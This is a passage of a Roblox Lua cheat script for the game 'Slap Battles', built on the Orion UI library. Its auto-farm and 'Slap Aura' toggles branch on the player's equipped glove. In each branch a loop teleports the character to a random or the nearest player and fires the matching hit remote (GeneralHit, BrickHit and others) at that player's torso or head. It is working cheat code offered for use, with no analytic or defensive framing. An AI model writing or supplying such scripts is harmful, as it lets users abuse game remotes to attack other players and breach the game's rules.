local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").RojoHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Hitman" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").HitmanHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Retro" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").RetroHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Null" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").NullHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
                        elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Plank" or game.Players.LocalPlayer.leaderstats.Glove.Value == "bus" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Hybrid" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Rage" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Frostbite" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Spoonful" or game.Players.LocalPlayer.leaderstats.Glove.Value == "MEGAROCK" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Obby" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Goofy" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Firework" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Elude" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Run" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Santa" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Recall" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Beserk" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Kinetic" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Knockoff" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Joust" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Lure" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Voodoo" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Divebomb" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Lamp" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Moon" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Jupiter" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Necromancer" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Blasphemy" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Pan" or game.Players.LocalPlayer.leaderstats.Glove.Value == "rob" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Hammer" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Quake" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Trap" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Titan" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Glovel" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
                        elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "bob" then
  while _G.SlapOn do
    local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function getNearestPlayer()
    local closestPlayer = nil
    local closestDistance = math.huge
    local localPlayer = Players.LocalPlayer
    local localCharacter = localPlayer.Character
    local localTorso = localCharacter and localCharacter:FindFirstChild("Torso")

    if not localTorso then return nil end

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local character = player.Character
            local torso = character and character:FindFirstChild("Torso")
            if torso then
                local distance = (localTorso.Position - torso.Position).magnitude
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end

    return closestPlayer
end

local nearestPlayer = getNearestPlayer()

if nearestPlayer then
    local nearestTorso = nearestPlayer.Character.Torso
    local args = {
        [1] = nearestTorso
    }

    ReplicatedStorage:WaitForChild("bobhit"):FireServer(unpack(args))
else
    warn("No nearest player found")
end
 task.wait(0.7)
end
  end
else
   OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in the Arena.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
wait(0.2)
FarmOnToggle:Set(false)
   end
  end
end
})


SlapAuraTog = TabMain:AddToggle({
    Name = "Slap Aura",
    Default = false,
    Callback = function(Value)
 _G.SlapAura = Value
 if _G.SlapAura == true then
   if game.Players.LocalPlayer.Character:FindFirstChild("entered") then
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Default" then
                        while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
            end
            elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Dual" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
            end
            elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Diamond" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("DiamondHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "ZZZZZZZ" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ZZZZZZZHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Extended" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
          
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Brick" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("BrickHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Snow" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("SnowHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Pull" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("PullHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Flash" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("FlashHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Spring" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("springhit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end

                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Swapper" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("HitSwapper"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Bull" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("BullHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Dice" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("DiceHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ghost" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GhostHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Thanos" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ThanosHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Stun" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("HtStun"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "L.O.L.B.O.M.B" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Za Hando" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("zhramt"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                          elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Fort" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("Fort"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Magnet" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("MagnetHIT"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end

  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Pusher" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("PusherHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Anchor" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("hitAnchor"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Space" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
